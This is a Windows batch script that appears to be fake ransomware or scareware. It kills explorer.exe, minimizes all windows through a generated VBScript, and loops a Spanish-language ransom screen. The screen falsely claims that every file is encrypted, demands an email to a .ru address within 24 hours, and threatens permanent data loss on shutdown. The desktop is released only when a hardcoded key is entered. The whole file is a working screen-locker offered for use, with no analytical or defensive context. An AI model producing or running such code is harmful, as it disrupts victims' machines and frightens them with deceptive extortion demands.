@echo off
color 0A
;MODE CON: COLS=400 LINES=299
title YOU HAVE BEEN PWNED

taskkill /F /IM explorer.exe
start /min cmd /c "echo & echo Minimizing windows... & timeout 2 >nul & (echo CreateObject^("Shell.Application"^).MinimizeAll & echo Set oWin = CreateObject^("WScript.Shell"^) & echo oWin.SendKeys "^{ESC}" & echo Set oWin = Nothing) >%temp%\minimize.vbs & cscript //nologo %temp%\minimize.vbs & del %temp%\minimize.vbs

:loop
cls
echo ================================================================
echo                       YOU HAVE BEEN PWNED!                      
echo ================================================================
echo.
echo.
echo                 TODOS TUS ARCHIVOS ESTAN CIFRADOS!
echo.
echo             Si quieres recuperar todos tus archivos,
echo             envia un correo a: pwned@cibersecurity.ru
echo             en las proximas 24 horas.
echo.
echo             De lo contrario, perderas permanentemente
echo             el acceso a todos tus documentos.
echo.
echo.
echo                       _________-----_____
echo             ____------           __      ----_
echo       ___----             ___------              \
echo          ----________        ----                 \
echo                     -----__    ^|             _____)
echo                          __-                /     \
echo              _______-----    ___--          \    /)\
echo        ------_______      ---____            \__/  /
echo                     -----__    \ --    _          /\
echo                            --__--__     \_____/   \_/\
echo                                    ---^|   /          ^|
echo                                       ^| ^|___________^|
echo                                       ^| ^| ((_(_)^| )_)
echo                                       ^|  \_((_(_)^|/(_)
echo                                        \             (
echo                                         \_____________)
echo.
echo.	        
echo	          =============================================
echo           ==  SI APAGA EL SISTEMA SE PERDERAN TODOS  ==
echo           ==              LOS DATOS!!!!              ==
echo ================================================================
echo.

setlocal enabledelayedexpansion
set "password=hola20"

set /p "decrypter=Ingresa la clave para descifrar tus archivos: "
if "!decrypter!"=="!password!" (
    echo Descifrando tus archivos...
    echo Felicidades! Tus archivos han sido descifrados exitosamente.
    start explorer.exe
    pause
    exit
) else (
    echo Credencial incorrecta. Intenta nuevamente.
    timeout /t 3 >nul
    goto loop
)
